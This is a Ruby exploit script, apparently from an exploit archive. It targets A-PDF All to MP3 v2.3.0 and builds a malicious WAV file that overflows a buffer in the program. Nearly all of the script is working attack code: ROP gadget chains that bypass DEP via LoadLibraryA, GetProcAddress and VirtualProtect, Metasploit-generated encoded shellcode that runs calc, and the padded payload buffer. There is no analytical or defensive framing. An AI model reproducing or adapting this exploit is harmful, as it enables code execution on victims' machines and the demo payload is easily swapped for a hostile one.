#!/usr/bin/ruby
#
#[+]Exploit Title: A-PDF All to MP3 v2.3.0 Universal DEP Bypass Exploit
#[+]Date: 09\08\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.a-pdf.com/all-to-mp3/
#[+]Version: 2.3.0
#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
#[+]CVE: N/A
#
#Dep bypass method:
#LoadLibraryA("kernel32.dll") + GetProcAddress(%EAX,"VirtualProtect") + VirtualProtect(%ESP,0x400,0x40,0x10007064) == Universal DEP BYPASS. :)
#
#

#Address for LoadLibraryA 0x6D00CEE8
########################################ROP FOR LOAD LoadLIbraryA("kernell32.dll")###########################
rop = [0x1001FD1C].pack('V') # POP ESI # RETN
rop += [0x6D00CEE8].pack('V') # Address to LoadLibraryA
rop += [0x004936B4].pack('V') # POP EBP # RETN
rop += [0x1003ba4d].pack('V') # ADD ESP,2C # RETN    // Endere�o de retorno da fun�ao LoadLibraryA
rop += [0x004cc008].pack('V') # PUSHAD # POP EBX # RETN 
rop += "kernel32.dll\x00"
rop += "A" * 15
#########################################ROP END HERE##########################################################

#Address to GetProcAddress 0x6D00CEC8 
#########################################ROP FOR GetProcAddress################################################
rop += [0x0040BF8F].pack('V') # POP EDI # RETN
rop += [0x6D00CEC8].pack('V') # Address to GetProcAddress
rop += [0x1001FD1C].pack('V') # POP ESI # RETN
rop += [0x1003ba4d].pack('V') # ADD ESP,2C # RETN  // Endere�o de retorno da fun�ao GetProcAddress
rop += [0x005c59cb].pack('V') # MOV EBP,EAX # RETN 
rop += [0x004cc014].pack('V') # PUSHAD # RETN 
rop += "VirtualProtect\x00"
rop += "A" * 13
#########################################ROP END HERE##########################################################

#########################################ROP FOR VirtualProtect################################################
rop += [0x00544a41].pack('V') # XCHG EAX,ESI # RETN 
rop += [0x004AEC05].pack('V') # POP EBP # RETN
rop += [0x00436E98].pack('V') # JMP ESP // Endere�o de retorno da fun�ao VirtualProtect
rop += [0x1002FDC2].pack('V') # POP EBX # RETN
rop += [0x00000500].pack('V') # Valor de dwSize
rop += [0x00402f24].pack('V') # POP EDX # RETN
rop += [0x00000040].pack('V') # Valor de flNewProtect
rop += [0x005c373c].pack('V') # POP ECX # RETN 
rop += [0x0040108E].pack('V') # Valor de lpflOldProtect
rop += [0x004cc008].pack('V') # PUSHAD # POP EBX # RETN 
#########################################ROP END HERE##########################################################

# windows/exec - 460 bytes
# http://www.metasploit.com
# Encoder: x86/alpha_upper
# EXITFUNC=process, CMD=calc
shellcode =
"\xdb\xc1\xd9\x74\x24\xf4\x5b\x53\x59\x49\x49\x49\x43\x43" +
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58" +
"\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42" +
"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30" +
"\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d\x38" +
"\x4c\x49\x43\x30\x45\x50\x45\x50\x43\x50\x4d\x59\x5a\x45" +
"\x50\x31\x49\x42\x52\x44\x4c\x4b\x50\x52\x56\x50\x4c\x4b" +
"\x51\x42\x54\x4c\x4c\x4b\x56\x32\x52\x34\x4c\x4b\x52\x52" +
"\x51\x38\x54\x4f\x4e\x57\x50\x4a\x51\x36\x50\x31\x4b\x4f" +
"\x50\x31\x4f\x30\x4e\x4c\x47\x4c\x45\x31\x43\x4c\x43\x32" +
"\x56\x4c\x51\x30\x4f\x31\x58\x4f\x54\x4d\x45\x51\x49\x57" +
"\x5a\x42\x5a\x50\x51\x42\x51\x47\x4c\x4b\x51\x42\x52\x30" +
"\x4c\x4b\x47\x32\x47\x4c\x45\x51\x4e\x30\x4c\x4b\x47\x30" +
"\x43\x48\x4d\x55\x4f\x30\x52\x54\x50\x4a\x45\x51\x58\x50" +
"\x50\x50\x4c\x4b\x47\x38\x45\x48\x4c\x4b\x56\x38\x51\x30" +
"\x45\x51\x4e\x33\x4d\x33\x47\x4c\x47\x39\x4c\x4b\x50\x34" +
"\x4c\x4b\x45\x51\x49\x46\x50\x31\x4b\x4f\x56\x51\x4f\x30" +
"\x4e\x4c\x49\x51\x58\x4f\x54\x4d\x45\x51\x4f\x37\x50\x38" +
"\x4d\x30\x52\x55\x4c\x34\x54\x43\x43\x4d\x5a\x58\x47\x4b" +
"\x43\x4d\x47\x54\x43\x45\x4b\x52\x50\x58\x4c\x4b\x56\x38" +
"\x51\x34\x45\x51\x4e\x33\x52\x46\x4c\x4b\x54\x4c\x50\x4b" +
"\x4c\x4b\x51\x48\x45\x4c\x43\x31\x58\x53\x4c\x4b\x45\x54" +
"\x4c\x4b\x43\x31\x4e\x30\x4c\x49\x47\x34\x56\x44\x47\x54" +
"\x51\x4b\x51\x4b\x43\x51\x56\x39\x50\x5a\x50\x51\x4b\x4f" +
"\x4b\x50\x50\x58\x51\x4f\x51\x4a\x4c\x4b\x54\x52\x5a\x4b" +
"\x4b\x36\x51\x4d\x52\x4a\x45\x51\x4c\x4d\x4c\x45\x4e\x59" +
"\x43\x30\x45\x50\x43\x30\x50\x50\x52\x48\x50\x31\x4c\x4b" +
"\x52\x4f\x4c\x47\x4b\x4f\x4e\x35\x4f\x4b\x5a\x50\x4f\x45" +
"\x4f\x52\x56\x36\x45\x38\x49\x36\x5a\x35\x4f\x4d\x4d\x4d" +
"\x4b\x4f\x49\x45\x47\x4c\x43\x36\x43\x4c\x54\x4a\x4b\x30" +
"\x4b\x4b\x4d\x30\x52\x55\x54\x45\x4f\x4b\x47\x37\x54\x53" +
"\x43\x42\x52\x4f\x52\x4a\x43\x30\x50\x53\x4b\x4f\x58\x55" +
"\x43\x53\x43\x51\x52\x4c\x45\x33\x45\x50\x41\x41"
buf = "A" * 4128
buf += rop
buf += "\x90" * 10
buf += shellcode
buf += "C" * 2000
File.open("Exploit.wav","wb") do |f|
f.write buf
f.close
end
